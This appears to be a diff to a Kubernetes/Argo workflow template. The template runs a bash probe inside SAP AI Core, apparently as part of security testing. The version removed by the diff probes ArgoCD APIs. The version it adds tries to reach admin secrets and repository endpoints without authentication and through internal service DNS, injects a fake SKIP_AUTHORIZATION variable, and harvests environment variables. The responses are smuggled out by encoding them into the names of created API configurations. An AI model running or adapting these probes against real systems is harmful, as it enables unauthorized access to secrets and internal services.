@@ -10,7 +10,7 @@ metadata:
   labels:
     scenarios.ai.sap.com/id: "bb14-scenario"
     executables.ai.sap.com/id: "bb14-probe"
-    ai.sap.com/version: "52.0.0"
+    ai.sap.com/version: "53.0.0"
 spec:
   entrypoint: main
   templates:
@@ -20,11 +20,18 @@ spec:
         ai.sap.com/resourcePlan: starter
     container:
       image: nicolaka/netshoot:latest
+      env:
+      - name: AICORE_EXECUTION_ID
+        value: "fake-exec-id"
+      - name: AICORE_TRACKING_ENDPOINT
+        value: "https://api.ai.sec-eu10.eu-central-1.aws.ml.hana.ondemand.com/v2"
+      - name: SKIP_AUTHORIZATION
+        value: "true"
       command:
       - bash
       - -c
       - |
-        # V52: Try ArgoCD native API from pod for manifest content
+        # V53: Test auth bypass via env vars + internal tracking API
         AUTH_URL="https://cf-aicore-security-bb-14.authentication.eu10.hana.ondemand.com"
         API="https://api.ai.sec-eu10.eu-central-1.aws.ml.hana.ondemand.com"
         CID="sb-aicore-bb-14!b627554|aicore-xsuaa-std!b563784"
@@ -35,66 +42,81 @@ spec:
           | python3 -c "import json,sys; print(json.load(sys.stdin).get('access_token','FAIL'))" 2>/dev/null)
 
         save() {
-          local name="v52-$(echo "$1" | tr -c 'a-zA-Z0-9._-' '-' | head -c 220)"
+          local name="v53-$(echo "$1" | tr -c 'a-zA-Z0-9._-' '-' | head -c 220)"
           curl -sk -X POST "${API}/v2/lm/configurations" \
             -H "Authorization: Bearer $JWT" -H "AI-Resource-Group: default" \
             -H "Content-Type: application/json" \
             -d "{\"name\":\"${name}\",\"executableId\":\"bb14-probe\",\"scenarioId\":\"bb14-scenario\"}" 2>/dev/null > /dev/null
         }
 
-        # ArgoCD service IP (from V34) and pod IP (from SSRF error)
-        ARGOCD_SVC="100.107.174.75"
-        ARGOCD_POD="100.64.80.38"
-        ARGOCD_DNS="argocd-server.argocd.svc.cluster.local"
+        # 1. Test public API WITHOUT auth header (from inside cluster)
+        echo "=== NO-AUTH API ===" >&2
+        R=$(curl -sk --connect-timeout 5 "${API}/v2/admin/secrets" -H "AI-Resource-Group: default" 2>&1 | head -c 200)
+        save "noauth-secrets-$(echo $R | head -c 150)"
 
-        # 1. Try ArgoCD API via service IP (port 80/443)
-        echo "=== ARGOCD API VIA SVC IP ===" >&2
-        for port in 80 443 8080; do
-          R=$(curl -sk --connect-timeout 3 "http://${ARGOCD_SVC}:${port}/api/v1/applications" 2>&1 | head -c 200)
-          if [ -n "$R" ] && ! echo "$R" | grep -q "refused\|timed out"; then
-            save "svc-${port}-apps-$(echo $R | head -c 150)"
-          fi
-          R=$(curl -sk --connect-timeout 3 "https://${ARGOCD_SVC}:${port}/api/v1/applications" 2>&1 | head -c 200)
-          if [ -n "$R" ] && ! echo "$R" | grep -q "refused\|timed out"; then
-            save "svc-https-${port}-apps-$(echo $R | head -c 150)"
+        R=$(curl -sk --connect-timeout 5 "${API}/v2/lm/executions" -H "AI-Resource-Group: default" 2>&1 | head -c 200)
+        save "noauth-execs-$(echo $R | head -c 150)"
+
+        R=$(curl -sk --connect-timeout 5 "${API}/v2/admin/repositories" -H "AI-Resource-Group: default" 2>&1 | head -c 200)
+        save "noauth-repos-$(echo $R | head -c 150)"
+
+        # 2. Test with empty Authorization header
+        R=$(curl -sk --connect-timeout 5 "${API}/v2/admin/secrets" -H "Authorization: " -H "AI-Resource-Group: default" 2>&1 | head -c 200)
+        save "emptyauth-secrets-$(echo $R | head -c 150)"
+
+        # 3. Test internal tracking API endpoints
+        echo "=== TRACKING API ===" >&2
+        # Try the known internal hostname from SDK
+        TRACKING="api.ai.sec-eu10.mlfprod.internal.live.k8s.ondemand.com"
+        R=$(curl -sk --connect-timeout 5 "https://${TRACKING}/api/v1" 2>&1 | head -c 200)
+        save "tracking-v1-$(echo $R | head -c 150)"
+
+        R=$(curl -sk --connect-timeout 5 "https://${TRACKING}/v2/lm/executions" -H "AI-Resource-Group: default" 2>&1 | head -c 200)
+        save "tracking-execs-$(echo $R | head -c 150)"
+
+        # 4. Try ml-tracking namespace services
+        for svc in ml-tracking tracking-server mlflow; do
+          ip=$(dig +short "${svc}.ml-tracking.svc.cluster.local" 2>/dev/null | head -1)
+          if [ -n "$ip" ]; then
+            save "ml-track-dns-${svc}-${ip}"
+            R=$(curl -sk --connect-timeout 3 "http://${ip}:80/" 2>&1 | head -c 150)
+            save "ml-track-${svc}-80-$(echo $R | head -c 100)"
+            R=$(curl -sk --connect-timeout 3 "http://${ip}:5000/" 2>&1 | head -c 150)
+            save "ml-track-${svc}-5000-$(echo $R | head -c 100)"
           fi
         done
 
-        # 2. Try ArgoCD API via pod IP
-        echo "=== ARGOCD API VIA POD IP ===" >&2
-        for port in 8080 8083 443; do
-          R=$(curl -sk --connect-timeout 3 "https://${ARGOCD_POD}:${port}/api/v1/applications" 2>&1 | head -c 200)
-          save "pod-${port}-$(echo $R | head -c 150)"
+        # 5. Try the API via internal K8s service DNS (bypass external gateway)
+        echo "=== INTERNAL API ===" >&2
+        # The API might have an internal service name
+        for svc in ai-core-api api-server ml-api-facade resource-group-manager; do
+          for ns in aicore ml-api-facade; do
+            ip=$(dig +short "${svc}.${ns}.svc.cluster.local" 2>/dev/null | head -1)
+            if [ -n "$ip" ]; then
+              save "intapi-${svc}-${ns}-${ip}"
+              # Try accessing admin endpoints without auth via internal service
+              R=$(curl -sk --connect-timeout 3 "http://${ip}:80/v2/admin/secrets" -H "AI-Resource-Group: default" 2>&1 | head -c 200)
+              save "intapi-${svc}-secrets-$(echo $R | head -c 150)"
+              R=$(curl -sk --connect-timeout 3 "http://${ip}:8080/v2/admin/secrets" -H "AI-Resource-Group: default" 2>&1 | head -c 200)
+              save "intapi-${svc}-8080-$(echo $R | head -c 150)"
+            fi
+          done
         done
 
-        # 3. Try ArgoCD API via DNS
-        echo "=== ARGOCD API VIA DNS ===" >&2
-        R=$(curl -sk --connect-timeout 5 "http://${ARGOCD_DNS}/api/v1/applications" 2>&1 | head -c 200)
-        save "dns-apps-$(echo $R | head -c 150)"
-        R=$(curl -sk --connect-timeout 5 "https://${ARGOCD_DNS}/api/v1/applications" 2>&1 | head -c 200)
-        save "dns-https-apps-$(echo $R | head -c 150)"
+        # 6. Try resource-group-manager directly (found in V51 KSM data)
+        echo "=== RG MANAGER ===" >&2
+        RGM_IP=$(dig +short "resource-group-manager.aicore.svc.cluster.local" 2>/dev/null | head -1)
+        save "rgm-ip-${RGM_IP:-NXDOMAIN}"
+        if [ -n "$RGM_IP" ]; then
+          for port in 80 8080 8443; do
+            R=$(curl -sk --connect-timeout 3 "http://${RGM_IP}:${port}/" 2>&1 | head -c 200)
+            save "rgm-${port}-$(echo $R | head -c 150)"
+          done
+        fi
 
-        # 4. Try without auth - some ArgoCD allow anonymous read
-        R=$(curl -sk --connect-timeout 5 "http://${ARGOCD_DNS}/api/v1/settings" 2>&1 | head -c 200)
-        save "dns-settings-$(echo $R | head -c 150)"
+        # 7. Check what env vars the container actually has (AICORE_* injected by platform?)
+        echo "=== ENV ===" >&2
+        AICORE_VARS=$(env | grep -i "AICORE\|AI_CORE\|SAP\|SKIP_AUTH" | tr '\n' '|')
+        save "env-aicore-${AICORE_VARS}"
 
-        # 5. Try repo-server gRPC-web (some expose HTTP transcoding)
-        REPO_SRV="argocd-repo-server.argocd.svc.cluster.local"
-        R=$(curl -sk --connect-timeout 3 "http://${REPO_SRV}:8081/" 2>&1 | head -c 150)
-        save "reposrv-8081-$(echo $R | head -c 100)"
-        R=$(curl -sk --connect-timeout 3 "http://${REPO_SRV}:8084/" 2>&1 | head -c 150)
-        save "reposrv-8084-$(echo $R | head -c 100)"
-
-        # 6. Try ArgoCD API with our XSUAA token (might be accepted)
-        R=$(curl -sk --connect-timeout 5 -H "Authorization: Bearer $JWT" "http://${ARGOCD_DNS}/api/v1/applications" 2>&1 | head -c 200)
-        save "dns-jwt-apps-$(echo $R | head -c 150)"
-
-        # 7. Try the manifests endpoint specifically
-        R=$(curl -sk --connect-timeout 5 "http://${ARGOCD_DNS}/api/v1/applications/ghe-gitops-app/manifests" 2>&1 | head -c 200)
-        save "dns-manifests-$(echo $R | head -c 150)"
-
-        # 8. Try listing repos from ArgoCD API
-        R=$(curl -sk --connect-timeout 5 "http://${ARGOCD_DNS}/api/v1/repositories" 2>&1 | head -c 200)
-        save "dns-repos-$(echo $R | head -c 150)"
-
-        echo "V52 DONE" >&2
+        echo "V53 DONE" >&2
